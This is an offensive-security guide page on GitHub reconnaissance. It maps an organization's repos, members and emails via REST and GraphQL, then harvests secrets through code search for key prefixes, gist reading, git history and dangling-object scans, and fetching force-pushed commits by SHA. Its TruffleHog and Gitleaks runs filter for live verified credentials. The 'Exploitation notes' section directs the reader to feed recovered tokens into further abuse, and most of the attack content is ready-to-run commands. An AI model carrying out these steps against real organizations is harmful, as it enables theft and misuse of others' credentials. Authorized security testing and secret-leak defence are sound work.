---
title: "Reconnaissance: enumerating organizations, repositories, and harvesting secrets"
order: 1
description: "Mapping a GitHub org's repos, members, and forks through REST and GraphQL, GitHub code search and gists, and harvesting credentials from full clone history, dangling blobs, and pack objects with TruffleHog and Gitleaks."
keywords:
  - GitHub enumeration
  - GitHub code search
  - git history secrets
  - trufflehog
  - gitleaks
---

# Reconnaissance

Reconnaissance against GitHub has two goals: **map the org** (repos, members, forks, teams) so you know the surface, and **harvest secrets** that unlock the next step. The second goal is where GitHub is uniquely generous: a secret committed once and later "removed" almost always survives in history, in forks, and in dangling objects that a normal `git clone` still carries.

## Enumerating the organization over REST

With or without a token, the REST API lists public structure; a token widens it to private repos the principal can see. Pagination matters: the API caps at 100 per page and you must walk `Link` headers or use `--paginate`.

```bash
# Repos, members, teams (gh --paginate walks every page)
gh api /orgs/ACME/repos --paginate -q '.[] | [.full_name, .visibility, .pushed_at] | @tsv'
gh api /orgs/ACME/members --paginate -q '.[].login'
gh api /orgs/ACME/teams --paginate -q '.[].slug'

# Raw curl equivalent with manual pagination
curl -s -H "Authorization: token $GH_TOKEN" \
  'https://api.github.com/orgs/ACME/repos?per_page=100&page=1'
```

Recently pushed private repos are the live ones; archived or stale repos are where old credentials rot undisturbed.

## GraphQL for dense pulls

GraphQL returns members, their repos, and metadata in one round trip, which is quieter and faster than dozens of REST calls:

```bash
curl -s -H "Authorization: bearer $GH_TOKEN" https://api.github.com/graphql -d '{
  "query": "query { organization(login: \"ACME\") { membersWithRole(first: 100) { nodes { login email } } repositories(first: 100, privacy: PRIVATE) { nodes { nameWithOwner pushedAt } } } }"
}'
```

Member `email` fields leak internal address format and feed phishing or commit-author correlation.

## Code search across the org

GitHub code search finds secrets and sensitive patterns across every repo the token can read. Scope with qualifiers:

```bash
# Secrets patterns scoped to the org
gh search code --owner ACME 'AKIA'                 # AWS key prefix
gh search code --owner ACME 'xoxb-'                # Slack bot token
gh search code --owner ACME filename:.npmrc _authToken
gh api -X GET /search/code -f q='org:ACME "BEGIN RSA PRIVATE KEY"'
```

A hit returns the file path and a text fragment; follow it to the blob and read surrounding lines for the full value. Code search indexes the default branch only, so it misses secrets that live solely in history, covered next.

## Gists

Members leak into personal gists that the org never sees. Enumerate a user's public gists and read them:

```bash
gh api /users/jdoe/gists --paginate -q '.[].files | keys[]'
curl -s https://api.github.com/users/jdoe/gists | jq -r '.[].git_pull_url'
```

Secret gists are not listed for other users, but their raw URLs are unguessable rather than access-controlled, so any such URL found in logs or referrers is readable.

## Secrets in clone history

A committed-then-deleted secret stays reachable in the commit graph. Clone and walk all history, not just the current tree:

```bash
git clone https://github.com/ACME/service.git && cd service
git log -p --all -S 'AKIA' --source                # every add/remove of the string, across all refs
git log -p --all | grep -iE 'password|secret|token|api[_-]?key|BEGIN .*PRIVATE KEY'
```

`-S` (the "pickaxe") surfaces the exact commit that introduced or removed a string, with `--source` naming the ref it lives on. This is where `git rebase`/`git filter-branch` "cleanups" fail: the old commit is unreferenced but still in the pack.

## Dangling and deleted objects

`git fsck` surfaces objects present in a repository you already hold but no longer referenced by any branch or tag, for example after a local amend, rebase, or force-push where the old objects are still in your object store:

```bash
git fsck --lost-found --dangling 2>/dev/null       # dangling commit/blob SHAs in THIS local repo
git cat-file -p <dangling-blob-sha>                # dump a dangling blob's contents
# Walk every object reachable from refs (branches, tags, HEAD, stashes) and grep it
git rev-list --objects --all | awk '{print $1}' | while read o; do git cat-file -p "$o" 2>/dev/null; done | grep -iE 'AKIA|secret|token'
```

Know the limit: a plain clone transfers only objects reachable from the server's refs, so a secret already unreachable on the server (force-pushed over before you cloned) is not in your clone, and `git rev-list --all` walks refs, not the whole object store. `git fsck` therefore recovers only what dangles in a repo you already have. Reaching objects the server itself dropped is a GitHub-specific trick, below.

## Fetching deleted commits by SHA

On `github.com`, a repository and all its forks share one object store (a "repository network"), so a commit pushed to any of them stays retrievable by its full SHA even after the branch or fork is deleted. A dangling-commit SHA is routinely exposed in a pull request's timeline (the `PushEvent` force-push `before` field, closed-PR events), and any object in the network is then served by the Git Data API from the parent repo:

```bash
# dangling commit SHAs surface in events even after a force-push rewrote the branch
curl -s -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/ACME/service/events \
  | jq -r '.[]|.payload.before? // empty'
# fetch any object in the network by SHA from the parent, even after deletion
curl -s -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/ACME/service/commits/<full-sha>
curl -s -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/ACME/service/git/blobs/<blob-sha> | jq -r .content | base64 -d
```

This is how a secret committed then force-pushed away, or pushed to a since-deleted fork, stays readable: the object survives in the network and the API hands it to anyone who knows or can enumerate the SHA.

## Automated scanning

Run both a connector-based scanner over the org API and a deep-history scan over clones; they catch different things.

```bash
# TruffleHog across an org's repos, verifying live credentials as it goes
trufflehog github --org=ACME --token="$GH_TOKEN" --only-verified

# TruffleHog against a single repo including full history
trufflehog git https://github.com/ACME/service.git

# Gitleaks over the complete history of a local clone
gitleaks detect --source . --log-opts="--all" -v
```

`--only-verified` filters TruffleHog to secrets it could actually authenticate with, cutting noise to immediately usable credentials. Gitleaks `--log-opts="--all"` forces it across every ref, matching the manual pickaxe approach at scale.

## Exploitation notes

- Always scan history, not the checkout: `--all` and `git fsck` reach what code search and a plain clone cannot.
- Prefer verified hits (`--only-verified`) when you need a fast win; treat unverified hits as leads to validate by hand.
- A leaked commit SHA on a public repo is fetchable from the parent even if "deleted"; keep SHAs you see in logs and comments.
- Feed every token, key, or deploy credential you recover straight to [token and GITHUB_TOKEN abuse](token-and-github-token-abuse.md) to establish scope and reach.

## Tools

- **TruffleHog**: org-wide and per-repo secret scanning with live credential verification.
- **Gitleaks**: fast regex and entropy secret detection across full git history.
- **gh**: official CLI wrapping REST/GraphQL, `--paginate` and `search code` for enumeration.
- **git-dumper**: reconstruct a repo from an exposed `.git` directory on a web host.
- **gitrob** / **GitHound**: org and user attack-surface and secret discovery.

## References

- [GitHub REST API: repositories and search](https://docs.github.com/en/rest/repos/repos)
- [TruffleHog (Truffle Security)](https://github.com/trufflesecurity/trufflehog)
- [Gitleaks](https://github.com/gitleaks/gitleaks)
- [Truffle Security: anyone can access deleted and private repo data on GitHub](https://trufflesecurity.com/blog/anyone-can-access-deleted-and-private-repo-data-github)
- [GitHub docs: searching code](https://docs.github.com/en/search-github/searching-on-github/searching-code)
